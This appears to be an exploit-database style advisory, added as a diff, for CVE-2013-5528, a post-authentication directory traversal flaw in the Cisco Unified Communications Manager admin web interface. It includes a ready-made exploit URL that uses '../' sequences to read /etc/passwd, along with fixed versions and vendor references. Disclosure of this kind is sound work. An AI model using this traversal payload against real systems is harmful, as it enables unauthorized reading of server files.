@@ -1,0 +1,27 @@
+# Exploit Title: Cisco Unified Communications Manager Administrative Web Interface Directory traversal CVE-2013-5528
+# Date: 7th December 2016
+# Exploit Author: justpentest
+# Vendor Homepage: https://software.cisco.com/
+# Software Link: https://software.cisco.com/download/navigator.html?mdfid=268439621
+# Version: Cisco Unified Communications Manager Administrative Web Interface unpatched version of 7.x, 8.x or 9.x software
+# Contact: transform2secure@gmail.com
+# CVE : CVE-2013-5528
+
+
+1) Description: 
+Directory traversal vulnerability exists in Cisco Unified Communications Manager Administrative Web Interface CVE-2013-5528.
+The vulnerability is due to a failure to properly sanitize user-supplied input passed to a specific function. 
+An attacker could exploit this vulnerability by supplying a series of directory traversal characters after authentication, allowing the attacker to designate a file outside the restricted directory to be returned. 
+An exploit could allow the attacker to obtain the contents of any file that is readable by the Apache Tomcat service account.
+
+2) Exploit:
+http://justpentest.com/ccmadmin/bulkvivewfilecontents.do?filetype=samplefile&fileName=../../../../../../../../../../../../../../../../etc/passwd
+
+3) Fixed version:
+Cisco has fixed the vulnerability in 9.1.2, 10.5.2 and 11.5.x.
+
+For more details visit http://justpentest.blogspot.in/2016/12/lfi-and-xss-on-cisco-unified-CM-CVE-2013-5528.html
+
+4) References:
+ https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20131011-CVE-2013-5528 
+https://bst.cloudapps.cisco.com/bugsearch/bug/CSCui78815  
